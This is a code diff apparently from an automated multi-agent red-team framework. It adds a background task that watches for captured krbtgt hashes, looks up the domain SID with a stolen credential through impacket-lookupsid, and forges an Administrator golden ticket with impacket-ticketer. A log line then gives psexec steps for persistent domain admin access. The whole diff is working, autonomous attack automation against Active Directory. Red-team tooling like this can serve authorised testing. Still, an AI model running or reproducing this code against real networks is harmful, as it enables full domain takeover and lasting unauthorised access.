@@ -433,6 +433,7 @@ async def run_multi_agent_operation(  # noqa: PLR0912
         asyncio.create_task(
             _auto_local_admin_secretsdump(dispatcher), name="auto_local_admin_secretsdump"
         ),
+        asyncio.create_task(_auto_golden_ticket(dispatcher), name="auto_golden_ticket"),
     ]
 
     # Build initial prompt for orchestrator
@@ -2231,6 +2232,178 @@ async def _auto_local_admin_secretsdump(  # noqa: PLR0912
             break
         except Exception as e:
             logger.error(f"Auto local admin secretsdump error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+async def _auto_golden_ticket(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 30.0,
+) -> None:
+    """
+    Background task that automatically generates golden ticket when krbtgt hash is found.
+
+    Monitors the shared state for krbtgt hashes and automatically:
+    1. Extracts domain SID via lookupsid
+    2. Generates golden ticket with impacket-ticketer
+    3. Sets has_golden_ticket flag in state
+
+    This provides persistent domain admin access.
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between checks
+    """
+    import re
+
+    processed_domains: set[str] = set()  # Domains we've already generated tickets for
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # Skip if operation is complete
+            if state.completed:
+                logger.debug("Operation complete, stopping auto golden ticket")
+                break
+
+            # Look for krbtgt hashes we haven't processed yet
+            for hash_obj in state.all_hashes:
+                if hash_obj.username.lower() != "krbtgt":
+                    continue
+
+                if hash_obj.hash_type.lower() != "ntlm":
+                    continue
+
+                domain = hash_obj.domain
+                if not domain or domain.lower() in processed_domains:
+                    continue
+
+                # Found unprocessed krbtgt hash!
+                logger.warning(
+                    f"🎫 Auto-golden-ticket: Found krbtgt hash for {domain}, "
+                    "attempting to generate golden ticket"
+                )
+
+                # Need a credential to run lookupsid
+                cred = None
+                for c in state.all_credentials:
+                    if c.password and c.domain and c.domain.lower() == domain.lower():
+                        cred = c
+                        break
+
+                if not cred:
+                    # Try any credential
+                    for c in state.all_credentials:
+                        if c.password:
+                            cred = c
+                            break
+
+                if not cred:
+                    logger.warning(
+                        f"🎫 Auto-golden-ticket: No password credential available for SID lookup "
+                        f"in {domain}, skipping golden ticket (will retry)"
+                    )
+                    continue
+
+                # Find DC IP for this domain
+                dc_ip = None
+                for host in state.all_hosts:
+                    hostname = (host.hostname or "").lower()
+                    if domain.lower() in hostname and any(
+                        role.lower() in ("dc", "domain controller") for role in host.roles
+                    ):
+                        dc_ip = host.ip
+                        break
+
+                # Fallback to any DC
+                if not dc_ip:
+                    for host in state.all_hosts:
+                        if any(role.lower() in ("dc", "domain controller") for role in host.roles):
+                            dc_ip = host.ip
+                            break
+
+                if not dc_ip:
+                    logger.warning(f"🎫 Auto-golden-ticket: No DC IP found for {domain}, skipping")
+                    processed_domains.add(domain.lower())
+                    continue
+
+                # Run lookupsid to get domain SID
+                try:
+                    from ares.tools.red.common import run_tool
+
+                    cmd = [
+                        "impacket-lookupsid",
+                        f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
+                    ]
+                    stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
+                    output = stdout + "\n" + (stderr or "")
+
+                    # Parse domain SID from output
+                    sid_match = re.search(r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output)
+                    if not sid_match:
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: Could not extract domain SID for {domain}"
+                        )
+                        processed_domains.add(domain.lower())
+                        continue
+
+                    domain_sid = sid_match.group(1)
+                    logger.info(f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}")
+
+                    # Generate golden ticket
+                    cmd = [
+                        "impacket-ticketer",
+                        "-nthash",
+                        hash_obj.hash_value,
+                        "-domain-sid",
+                        domain_sid,
+                        "-domain",
+                        domain,
+                        "-user-id",
+                        "500",
+                        "Administrator",
+                    ]
+                    stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
+                    output = stdout + "\n" + (stderr or "")
+
+                    if returncode == 0 or "Saving ticket" in output:
+                        logger.success(
+                            f"🎫 GOLDEN TICKET GENERATED for {domain}!\n"
+                            f"→ Ticket saved as Administrator.ccache\n"
+                            f"→ Use: export KRB5CCNAME=Administrator.ccache\n"
+                            f"→ Then: psexec.py -k -no-pass dc.{domain}"
+                        )
+                        state.has_golden_ticket = True
+
+                        # Add to state timeline
+                        from ares.core.models import TimelineEvent
+
+                        state.operation_timeline.append(
+                            TimelineEvent(
+                                timestamp=datetime.now(timezone.utc),
+                                source="auto_golden_ticket",
+                                event_type="golden_ticket_forged",
+                                description=f"Golden ticket generated for {domain} Administrator",
+                                mitre_technique="T1558.001",
+                            )
+                        )
+                    else:
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: Failed to generate ticket for {domain}: {output}"
+                        )
+
+                except Exception as e:
+                    logger.warning(f"🎫 Auto-golden-ticket: Error generating ticket: {e}")
+
+                # Mark as processed either way
+                processed_domains.add(domain.lower())
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto golden ticket error: {e}", exc_info=True)
             await asyncio.sleep(check_interval)
 
 
